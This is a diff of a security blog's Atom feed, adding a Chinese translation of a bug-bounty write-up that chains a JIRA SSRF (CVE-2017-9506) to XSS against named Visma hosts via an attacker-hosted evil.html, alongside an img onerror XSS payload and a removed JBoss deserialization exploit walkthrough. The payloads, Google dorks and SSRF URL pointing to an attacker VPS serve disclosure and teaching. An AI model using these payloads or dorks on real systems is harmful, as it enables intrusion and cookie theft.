@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://TimeS0ng.github.io/"/>
-  <updated>2018-12-21T08:30:41.793Z</updated>
+  <updated>2018-12-23T03:53:43.837Z</updated>
   <id>http://TimeS0ng.github.io/</id>
   
   <author>
@@ -16,11 +16,42 @@
   <generator uri="http://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>第五篇翻译：SSRF to XSS</title>
+    <link href="http://TimeS0ng.github.io/2018/12/23/%E7%AC%AC%E4%BA%94%E7%AF%87%E7%BF%BB%E8%AF%91%EF%BC%9ASSRF-to-XSS/"/>
+    <id>http://TimeS0ng.github.io/2018/12/23/第五篇翻译：SSRF-to-XSS/</id>
+    <published>2018-12-23T03:53:31.000Z</published>
+    <updated>2018-12-23T03:53:43.837Z</updated>
+    
+    <content type="html"><![CDATA[<h4 id="原文：How-Outdated-JIRA-Instances-suffers-from-multiple-security-vulnerabilities"><a href="#原文：How-Outdated-JIRA-Instances-suffers-from-multiple-security-vulnerabilities" class="headerlink" title="原文：How Outdated JIRA Instances suffers from multiple security vulnerabilities?"></a>原文：<a href="https://medium.com/@Skylinearafat/how-outdated-jira-instances-suffers-from-multiple-security-vulnerabilities-6a88c45e9ec6" target="_blank" rel="external">How Outdated JIRA Instances suffers from multiple security vulnerabilities?</a></h4><p>####漏洞：SSRF + XSS</p>
+<p>####作者：Yeasir Arafat</p>
+<h4 id="难度：低"><a href="#难度：低" class="headerlink" title="难度：低"></a>难度：低</h4><h4 id="emsp-emsp-我正在测试一个名为visma的公共BUG赏金计划，像往常一样，我先收集了它的一些子域名。很少有子域能引起我的关注，但是下面列出的运行jira服务的子域成功吸引了我的注意"><a href="#emsp-emsp-我正在测试一个名为visma的公共BUG赏金计划，像往常一样，我先收集了它的一些子域名。很少有子域能引起我的关注，但是下面列出的运行jira服务的子域成功吸引了我的注意" class="headerlink" title="&emsp;&emsp;我正在测试一个名为visma的公共BUG赏金计划，像往常一样，我先收集了它的一些子域名。很少有子域能引起我的关注，但是下面列出的运行jira服务的子域成功吸引了我的注意"></a>&emsp;&emsp;我正在测试一个名为visma的公共BUG赏金计划，像往常一样，我先收集了它的一些子域名。很少有子域能引起我的关注，但是下面列出的运行jira服务的子域成功吸引了我的注意</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">1. https://jira.visma.lv/secure/Dashboard.jspa</div><div class="line">2. https://customer-incident.consulting.visma.com/secure/Dashboard.jspa</div></pre></td></tr></table></figure>
+<h4 id="如果你想找一些运行jira服务的子域练练手，可以试试使用下面的谷歌语法"><a href="#如果你想找一些运行jira服务的子域练练手，可以试试使用下面的谷歌语法" class="headerlink" title="如果你想找一些运行jira服务的子域练练手，可以试试使用下面的谷歌语法"></a>如果你想找一些运行jira服务的子域练练手，可以试试使用下面的谷歌语法</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">inurl:visma intitle:JIRA login</div><div class="line">inurl:companyname intitle:JIRA login</div></pre></td></tr></table></figure>
+<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_5/1.png" alt=""></p>
+<h4 id="emsp-emsp-我注意到域名https-customer-incident-consulting-visma-com-具有JIRA-6-3-1版本。我记得CVE-2017-9506-影响范围是Jira-versions-lt-7-3-5，所以我尝试验证一下该网站是否具有SSRF漏洞"><a href="#emsp-emsp-我注意到域名https-customer-incident-consulting-visma-com-具有JIRA-6-3-1版本。我记得CVE-2017-9506-影响范围是Jira-versions-lt-7-3-5，所以我尝试验证一下该网站是否具有SSRF漏洞" class="headerlink" title="&emsp;&emsp;我注意到域名https://customer-incident.consulting.visma.com 具有JIRA 6.3.1版本。我记得CVE-2017-9506 影响范围是Jira versions &lt; 7.3.5，所以我尝试验证一下该网站是否具有SSRF漏洞"></a>&emsp;&emsp;我注意到域名<a href="https://customer-incident.consulting.visma.com" target="_blank" rel="external">https://customer-incident.consulting.visma.com</a> 具有JIRA 6.3.1版本。我记得CVE-2017-9506 影响范围是Jira versions &lt; 7.3.5，所以我尝试验证一下该网站是否具有SSRF漏洞</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://customer-incident.consulting.visma.com/plugins/servlet/oauth/users/icon-uri?consumerUri=https://www.baidu.com</div></pre></td></tr></table></figure>
+<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_5/2.png" alt=""></p>
+<h4 id="emsp-emsp-我尝试获取一些网站内部数据或获取读取权限，但是我失败了。-如果你想用脚本自动测试网站是否存在jira漏洞，我建议你使用Github上的exp工具Jira-Scan"><a href="#emsp-emsp-我尝试获取一些网站内部数据或获取读取权限，但是我失败了。-如果你想用脚本自动测试网站是否存在jira漏洞，我建议你使用Github上的exp工具Jira-Scan" class="headerlink" title="&emsp;&emsp;我尝试获取一些网站内部数据或获取读取权限，但是我失败了。 如果你想用脚本自动测试网站是否存在jira漏洞，我建议你使用Github上的exp工具Jira-Scan"></a>&emsp;&emsp;我尝试获取一些网站内部数据或获取读取权限，但是我失败了。 如果你想用脚本自动测试网站是否存在jira漏洞，我建议你使用Github上的exp工具<a href="https://github.com/random-robbie/Jira-Scan" target="_blank" rel="external">Jira-Scan</a></h4><h4 id="emsp-emsp-另外，我还创建了一个简单的HTML页面，上面包含了XSS漏洞。我将重定向页面指定到我的XSS漏洞页面，这样我们就能够触发XSS，并且获取到https-customer-incident-consulting-visma-com-网站的用户cookie，而不是百度的cookie"><a href="#emsp-emsp-另外，我还创建了一个简单的HTML页面，上面包含了XSS漏洞。我将重定向页面指定到我的XSS漏洞页面，这样我们就能够触发XSS，并且获取到https-customer-incident-consulting-visma-com-网站的用户cookie，而不是百度的cookie" class="headerlink" title="&emsp;&emsp;另外，我还创建了一个简单的HTML页面，上面包含了XSS漏洞。我将重定向页面指定到我的XSS漏洞页面，这样我们就能够触发XSS，并且获取到https://customer-incident.consulting.visma.com 网站的用户cookie，而不是百度的cookie"></a>&emsp;&emsp;另外，我还创建了一个简单的HTML页面，上面包含了XSS漏洞。我将重定向页面指定到我的XSS漏洞页面，这样我们就能够触发XSS，并且获取到<a href="https://customer-incident.consulting.visma.com" target="_blank" rel="external">https://customer-incident.consulting.visma.com</a> 网站的用户cookie，而不是百度的cookie</h4><p>[*]攻击者创建的evil.html</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">&lt;title&gt;SSRF to XSS on Jira Vulnerable Instances&lt;/title&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line">  &lt;script&gt;</div><div class="line">   alert( document.domain + &quot; is vulnerable&quot; );</div><div class="line">            alert( document.cookie);</div><div class="line">&lt;/script&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure>
+<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_5/4.png" alt=""></p>
+<h4 id="emsp-emsp-现在访问我们自己在VPS上搭建的XSS漏洞网页，验证能否触发XSS并获取Cookie"><a href="#emsp-emsp-现在访问我们自己在VPS上搭建的XSS漏洞网页，验证能否触发XSS并获取Cookie" class="headerlink" title="&emsp;&emsp;现在访问我们自己在VPS上搭建的XSS漏洞网页，验证能否触发XSS并获取Cookie"></a>&emsp;&emsp;现在访问我们自己在VPS上搭建的XSS漏洞网页，验证能否触发XSS并获取Cookie</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://customer-incident.consulting.visma.com/plugins/servlet/oauth/users/icon-uri?consumerUri=http://VPSIP/evil.html</div></pre></td></tr></table></figure>
+<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_5/3.png" alt=""></p>
+<h2 id="打赏译者"><a href="#打赏译者" class="headerlink" title="打赏译者"></a>打赏译者</h2><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_1/money.png" alt=""></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h4 id=&quot;原文：How-Outdated-JIRA-Instances-suffers-from-multiple-security-vulnerabilities&quot;&gt;&lt;a href=&quot;#原文：How-Outdated-JIRA-Instances-suffers-from
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
     <title>第四篇翻译：XSS漏洞</title>
     <link href="http://TimeS0ng.github.io/2018/12/21/%E7%AC%AC%E5%9B%9B%E7%AF%87%E7%BF%BB%E8%AF%91%EF%BC%9AXSS%E6%BC%8F%E6%B4%9E/"/>
     <id>http://TimeS0ng.github.io/2018/12/21/第四篇翻译：XSS漏洞/</id>
     <published>2018-12-21T08:30:09.000Z</published>
-    <updated>2018-12-21T08:30:41.793Z</updated>
+    <updated>2018-12-23T03:53:05.490Z</updated>
     
     <content type="html"><![CDATA[<h4 id="原文：Dom-Based-XSS-in-ucweb-com"><a href="#原文：Dom-Based-XSS-in-ucweb-com" class="headerlink" title="原文：Dom Based XSS in ucweb.com"></a>原文：<a href="https://medium.com/@sudhanshur705/story-about-my-first-bug-bounty-9fe710be8241" target="_blank" rel="external">Dom Based XSS in ucweb.com</a></h4><h4 id="漏洞：XSS"><a href="#漏洞：XSS" class="headerlink" title="漏洞：XSS"></a>漏洞：XSS</h4><h4 id="作者：Sudhanshu-Rajbhar"><a href="#作者：Sudhanshu-Rajbhar" class="headerlink" title="作者：Sudhanshu Rajbhar"></a>作者：Sudhanshu Rajbhar</h4><h4 id="难度：低"><a href="#难度：低" class="headerlink" title="难度：低"></a>难度：低</h4><a id="more"></a>
 <h2 id="现在开始…"><a href="#现在开始…" class="headerlink" title="现在开始…."></a>现在开始….</h2><h4 id="emsp-emsp-首先，我检查了可用的子域名，但是最开始我并没有发现什么有趣的东西。直到当我开始测试ucweb-com的子域名时，我发现了这个子域-samsung-ucweb-com-，samsung-三星？似乎有点意思，所以我尝试用浏览器去访问它"><a href="#emsp-emsp-首先，我检查了可用的子域名，但是最开始我并没有发现什么有趣的东西。直到当我开始测试ucweb-com的子域名时，我发现了这个子域-samsung-ucweb-com-，samsung-三星？似乎有点意思，所以我尝试用浏览器去访问它" class="headerlink" title="&emsp;&emsp;首先，我检查了可用的子域名，但是最开始我并没有发现什么有趣的东西。直到当我开始测试ucweb.com的子域名时，我发现了这个子域 samsung.ucweb.com ，samsung 三星？似乎有点意思，所以我尝试用浏览器去访问它"></a>&emsp;&emsp;首先，我检查了可用的子域名，但是最开始我并没有发现什么有趣的东西。直到当我开始测试ucweb.com的子域名时，我发现了这个子域 samsung.ucweb.com ，samsung 三星？似乎有点意思，所以我尝试用浏览器去访问它</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/tanslate_4/1.png" alt=""></p>
@@ -28,7 +59,12 @@
 <h4 id="emsp-emsp-我打开了这个URL：http-samsung-ucweb-com-webstore-classify-html-dataKey-LifeStyle-amp-title-LifeStyle-并开始测试相关参数，当我测试title参数时，发现服务端并没有过滤title参数的值就将其打印出来了"><a href="#emsp-emsp-我打开了这个URL：http-samsung-ucweb-com-webstore-classify-html-dataKey-LifeStyle-amp-title-LifeStyle-并开始测试相关参数，当我测试title参数时，发现服务端并没有过滤title参数的值就将其打印出来了" class="headerlink" title="&emsp;&emsp;我打开了这个URL：http://samsung.ucweb.com/webstore/classify.html?dataKey=LifeStyle&amp;title=LifeStyle 并开始测试相关参数，当我测试title参数时，发现服务端并没有过滤title参数的值就将其打印出来了"></a>&emsp;&emsp;我打开了这个URL：<a href="http://samsung.ucweb.com/webstore/classify.html?dataKey=LifeStyle&amp;title=LifeStyle" target="_blank" rel="external">http://samsung.ucweb.com/webstore/classify.html?dataKey=LifeStyle&amp;title=LifeStyle</a> 并开始测试相关参数，当我测试title参数时，发现服务端并没有过滤title参数的值就将其打印出来了</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/tanslate_4/3.png" alt=""></p>
 <h4 id="emsp-emsp-所以我尝试构造payload来利用这个漏洞点，当我使用”-gt-lt-script-gt-alert-1-lt-script-gt-时并没有任何弹窗，所以我尝试用-lt-img-gt-标签"><a href="#emsp-emsp-所以我尝试构造payload来利用这个漏洞点，当我使用”-gt-lt-script-gt-alert-1-lt-script-gt-时并没有任何弹窗，所以我尝试用-lt-img-gt-标签" class="headerlink" title="&emsp;&emsp;所以我尝试构造payload来利用这个漏洞点，当我使用”&gt; &lt; script&gt;alert(1)&lt;/ script&gt;时并没有任何弹窗，所以我尝试用 &lt; img&gt;标签"></a>&emsp;&emsp;所以我尝试构造payload来利用这个漏洞点，当我使用”&gt; &lt; script&gt;alert(1)&lt;/ script&gt;时并没有任何弹窗，所以我尝试用 &lt; img&gt;标签</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&quot;&gt;&lt;img src=x onerror=alert(‘XSS’)&gt;</div></pre></td></tr></table></figure>
 <p><img src="http://img.027cgb.com/612577/times0ng_blog/tanslate_4/4.png" alt=""></p>
-<h2 id="视屏演示"><a href="#视屏演示" class="headerlink" title="视屏演示"></a>视屏演示</h2><video id="video" controls preload="none" poster="http://img5.imgtn.bdimg.com/it/u=750248180,3726006403&fm=26&gp=0.jpg"><br><source id="mp4" src="http://img.027cgb.com/612577/times0ng_blog/tanslate_4/XSS_in_alibaba.mp4" type="video/mp4"><br></video>]]></content>
+<h2 id="视屏演示"><a href="#视屏演示" class="headerlink" title="视屏演示"></a>视屏演示</h2><video id="video" controls preload="none" poster="http://img5.imgtn.bdimg.com/it/u=750248180,3726006403&fm=26&gp=0.jpg"><br><source id="mp4" src="http://img.027cgb.com/612577/times0ng_blog/tanslate_4/XSS_in_alibaba.mp4" type="video/mp4"><br></video>
+
+
+
+<h2 id="打赏译者"><a href="#打赏译者" class="headerlink" title="打赏译者"></a>打赏译者</h2><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_1/money.png" alt=""></p>
+]]></content>
     
     <summary type="html">
     
@@ -990,47 +1026,6 @@
     <summary type="html">
     
       &lt;h2 id=&quot;0x00-序言&quot;&gt;&lt;a href=&quot;#0x00-序言&quot; class=&quot;headerlink&quot; title=&quot;0x00. 序言&quot;&gt;&lt;/a&gt;0x00. 序言&lt;/h2&gt;&lt;h4 id=&quot;emsp-emsp-今天莫名奇妙的把自己的KVM和kali都搞崩了，心塞塞。趁着重装系统之余将安装kali和KVM的详细过程介绍给大家，下面笔者将用U盘在台式机上安装kali和KVM-…&quot;&gt;&lt;a href=&quot;#emsp-emsp-今天莫名奇妙的把自己的KVM和kali都搞崩了，心塞塞。趁着重装系统之余将安装kali和KVM的详细过程介绍给大家，下面笔者将用U盘在台式机上安装kali和KVM-…&quot; class=&quot;headerlink&quot; title=&quot;&amp;emsp;&amp;emsp;今天莫名奇妙的把自己的KVM和kali都搞崩了，心塞塞。趁着重装系统之余将安装kali和KVM的详细过程介绍给大家，下面笔者将用U盘在台式机上安装kali和KVM …&quot;&gt;&lt;/a&gt;&amp;emsp;&amp;emsp;今天莫名奇妙的把自己的KVM和kali都搞崩了，心塞塞。趁着重装系统之余将安装kali和KVM的详细过程介绍给大家，下面笔者将用U盘在台式机上安装kali和KVM …&lt;/h4&gt;
-    
-    </summary>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>JOBSS反序列化漏洞复现</title>
-    <link href="http://TimeS0ng.github.io/2017/12/27/JBOSS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
-    <id>http://TimeS0ng.github.io/2017/12/27/JBOSS反序列化漏洞复现/</id>
-    <published>2017-12-27T02:39:14.000Z</published>
-    <updated>2018-12-18T15:17:49.240Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="0x00-漏洞描述"><a href="#0x00-漏洞描述" class="headerlink" title="0x00. 漏洞描述"></a>0x00. 漏洞描述</h2><h4 id="2017年9月14日，国家信息安全漏洞共享平台（CNVD）收录了JBOSS-Application-Server反序列化命令执行漏洞（CNVD-2017-33724，对应CVE-2017-12149），远程攻击者利用漏洞可在未经任何身份验证的服务器主机上执行任意代码。漏洞细节和验证代码已公开，近期被不法分子利用出现大规模攻击尝试的可能性较大。"><a href="#2017年9月14日，国家信息安全漏洞共享平台（CNVD）收录了JBOSS-Application-Server反序列化命令执行漏洞（CNVD-2017-33724，对应CVE-2017-12149），远程攻击者利用漏洞可在未经任何身份验证的服务器主机上执行任意代码。漏洞细节和验证代码已公开，近期被不法分子利用出现大规模攻击尝试的可能性较大。" class="headerlink" title="2017年9月14日，国家信息安全漏洞共享平台（CNVD）收录了JBOSS Application Server反序列化命令执行漏洞（CNVD-2017-33724，对应CVE-2017-12149），远程攻击者利用漏洞可在未经任何身份验证的服务器主机上执行任意代码。漏洞细节和验证代码已公开，近期被不法分子利用出现大规模攻击尝试的可能性较大。"></a>2017年9月14日，国家信息安全漏洞共享平台（CNVD）收录了JBOSS Application Server反序列化命令执行漏洞（CNVD-2017-33724，对应CVE-2017-12149），远程攻击者利用漏洞可在未经任何身份验证的服务器主机上执行任意代码。漏洞细节和验证代码已公开，近期被不法分子利用出现大规模攻击尝试的可能性较大。</h4><a id="more"></a>
-<h2 id="0x01-漏洞复现"><a href="#0x01-漏洞复现" class="headerlink" title="0x01. 漏洞复现"></a>0x01. 漏洞复现</h2><h3 id="1-环境准备"><a href="#1-环境准备" class="headerlink" title="1). 环境准备"></a>1). 环境准备</h3><h4 id="1-JBOSS下载地址：http-download-jboss-org-jbossas-6-1-jboss-as-distribution-6-1-0-Final-zip"><a href="#1-JBOSS下载地址：http-download-jboss-org-jbossas-6-1-jboss-as-distribution-6-1-0-Final-zip" class="headerlink" title="1. JBOSS下载地址：http://download.jboss.org/jbossas/6.1/jboss-as-distribution-6.1.0.Final.zip"></a>1. JBOSS下载地址：<a href="http://download.jboss.org/jbossas/6.1/jboss-as-distribution-6.1.0.Final.zip" target="_blank" rel="external">http://download.jboss.org/jbossas/6.1/jboss-as-distribution-6.1.0.Final.zip</a></h4><h4 id="2-EXP下载地址：https-github-com-yunxu1-jboss-CVE-2017-12149"><a href="#2-EXP下载地址：https-github-com-yunxu1-jboss-CVE-2017-12149" class="headerlink" title="2. EXP下载地址：https://github.com/yunxu1/jboss-_CVE-2017-12149"></a>2. EXP下载地址：<a href="https://github.com/yunxu1/jboss-_CVE-2017-12149" target="_blank" rel="external">https://github.com/yunxu1/jboss-_CVE-2017-12149</a></h4><h3 id="2-环境搭建"><a href="#2-环境搭建" class="headerlink" title="2). 环境搭建"></a>2). 环境搭建</h3><h4 id="第一步：下载JBOSS环境，并解压"><a href="#第一步：下载JBOSS环境，并解压" class="headerlink" title="第一步：下载JBOSS环境，并解压"></a>第一步：下载JBOSS环境，并解压</h4><blockquote>
-<p>wget <a href="http://download.jboss.org/jbossas/6.1/jboss-as-distribution-6.1.0.Final.zip" target="_blank" rel="external">http://download.jboss.org/jbossas/6.1/jboss-as-distribution-6.1.0.Final.zip</a> </p>
-</blockquote>
-<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/JOBSS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20171227180801_LeUN0c_6293.jpeg" alt=""></p>
-<h4 id="第二步：修改配置文件，使网络中的主机都能访问JBOSS"><a href="#第二步：修改配置文件，使网络中的主机都能访问JBOSS" class="headerlink" title="第二步：修改配置文件，使网络中的主机都能访问JBOSS"></a>第二步：修改配置文件，使网络中的主机都能访问JBOSS</h4><blockquote>
-<p>vim ~/jboss-6.1.0.Final/server/default/deploy/jbossweb.sar/server.xml</p>
-</blockquote>
-<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/JOBSS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20171227180817_sOlp2c_6301.jpeg" alt=""></p>
-<h4 id="第三步：启动JBOSS"><a href="#第三步：启动JBOSS" class="headerlink" title="第三步：启动JBOSS"></a>第三步：启动JBOSS</h4><blockquote>
-<p>./jboss-6.1.0.Final/bin/run.sh</p>
-</blockquote>
-<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/JOBSS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20171227180832_WE4CD3_6309.jpeg" alt=""></p>
-<h4 id="第四步：下载EXP"><a href="#第四步：下载EXP" class="headerlink" title="第四步：下载EXP"></a>第四步：下载EXP</h4><blockquote>
-<p>git clone <a href="https://github.com/yunxu1/jboss-_CVE-2017-12149" target="_blank" rel="external">https://github.com/yunxu1/jboss-_CVE-2017-12149</a></p>
-</blockquote>
-<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/JOBSS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20171227180843_FQh3jJ_6316.jpeg" alt=""></p>
-<h3 id="3-信息收集"><a href="#3-信息收集" class="headerlink" title="3). 信息收集"></a>3). 信息收集</h3><h4 id="第一步：利用nmap对目标主机进行常用端口扫描"><a href="#第一步：利用nmap对目标主机进行常用端口扫描" class="headerlink" title="第一步：利用nmap对目标主机进行常用端口扫描"></a>第一步：利用nmap对目标主机进行常用端口扫描</h4><blockquote>
-<p>nmap 192.168.1.111 -A </p>
-</blockquote>
-<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/JOBSS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20171227180855_12YJ7L_6329.jpeg" alt=""></p>
-<h4 id="第二步：访问目标主机的8080端口，看看能否正常访问"><a href="#第二步：访问目标主机的8080端口，看看能否正常访问" class="headerlink" title="第二步：访问目标主机的8080端口，看看能否正常访问"></a>第二步：访问目标主机的8080端口，看看能否正常访问</h4><p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/JOBSS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20171227180912_UQjhJU_6322.jpeg" alt=""></p>
-<h3 id="4-漏洞利用"><a href="#4-漏洞利用" class="headerlink" title="4). 漏洞利用"></a>4). 漏洞利用</h3><h4 id="利用刚才下载好的EXP进行漏洞利用，打开jboss反序列化-CVE-2017-12149-jar"><a href="#利用刚才下载好的EXP进行漏洞利用，打开jboss反序列化-CVE-2017-12149-jar" class="headerlink" title="利用刚才下载好的EXP进行漏洞利用，打开jboss反序列化_CVE-2017-12149.jar"></a>利用刚才下载好的EXP进行漏洞利用，打开jboss反序列化_CVE-2017-12149.jar</h4><p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/JOBSS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20171227180923_jatTku_6333.jpeg" alt=""></p>
-<h2 id="0x02-总结"><a href="#0x02-总结" class="headerlink" title="0x02. 总结"></a>0x02. 总结</h2><h4 id="emsp-emsp-行千里路，不如读万卷书…"><a href="#emsp-emsp-行千里路，不如读万卷书…" class="headerlink" title="&emsp;&emsp;行千里路，不如读万卷书…"></a>&emsp;&emsp;行千里路，不如读万卷书…</h4>]]></content>
-    
-    <summary type="html">
-    
-      &lt;h2 id=&quot;0x00-漏洞描述&quot;&gt;&lt;a href=&quot;#0x00-漏洞描述&quot; class=&quot;headerlink&quot; title=&quot;0x00. 漏洞描述&quot;&gt;&lt;/a&gt;0x00. 漏洞描述&lt;/h2&gt;&lt;h4 id=&quot;2017年9月14日，国家信息安全漏洞共享平台（CNVD）收录了JBOSS-Application-Server反序列化命令执行漏洞（CNVD-2017-33724，对应CVE-2017-12149），远程攻击者利用漏洞可在未经任何身份验证的服务器主机上执行任意代码。漏洞细节和验证代码已公开，近期被不法分子利用出现大规模攻击尝试的可能性较大。&quot;&gt;&lt;a href=&quot;#2017年9月14日，国家信息安全漏洞共享平台（CNVD）收录了JBOSS-Application-Server反序列化命令执行漏洞（CNVD-2017-33724，对应CVE-2017-12149），远程攻击者利用漏洞可在未经任何身份验证的服务器主机上执行任意代码。漏洞细节和验证代码已公开，近期被不法分子利用出现大规模攻击尝试的可能性较大。&quot; class=&quot;headerlink&quot; title=&quot;2017年9月14日，国家信息安全漏洞共享平台（CNVD）收录了JBOSS Application Server反序列化命令执行漏洞（CNVD-2017-33724，对应CVE-2017-12149），远程攻击者利用漏洞可在未经任何身份验证的服务器主机上执行任意代码。漏洞细节和验证代码已公开，近期被不法分子利用出现大规模攻击尝试的可能性较大。&quot;&gt;&lt;/a&gt;2017年9月14日，国家信息安全漏洞共享平台（CNVD）收录了JBOSS Application Server反序列化命令执行漏洞（CNVD-2017-33724，对应CVE-2017-12149），远程攻击者利用漏洞可在未经任何身份验证的服务器主机上执行任意代码。漏洞细节和验证代码已公开，近期被不法分子利用出现大规模攻击尝试的可能性较大。&lt;/h4&gt;
     
     </summary>
     
